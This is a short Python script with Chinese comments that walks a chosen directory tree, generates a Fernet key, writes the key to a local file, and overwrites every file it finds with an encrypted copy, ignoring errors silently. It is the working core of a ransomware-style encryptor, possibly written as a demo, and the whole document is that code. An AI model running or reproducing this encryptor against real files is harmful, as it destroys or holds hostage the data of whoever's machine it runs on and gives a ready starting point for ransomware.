
from pathlib import Path
from cryptography.fernet import Fernet
import os

def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    try:
      for entry in os.scandir(baseDir):
          if entry.is_file():
              yield entry
          else:
              yield from scanRecurse(entry.path)
    except:
      print("FileNotFoundError")

#===================================================
files = []
directory = 'C://tmp'  # CHANGE THIS
for item in scanRecurse(directory):
    filePath = Path(item)
    files.append(filePath)
print(files[0])

#產生加密key
key = Fernet.generate_key()
with open("thekey2.key", "wb") as thekey:
    thekey.write(key)
    
#歷目標目錄含子目錄，然後加密
for file in files:
    try:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
    except:
        pass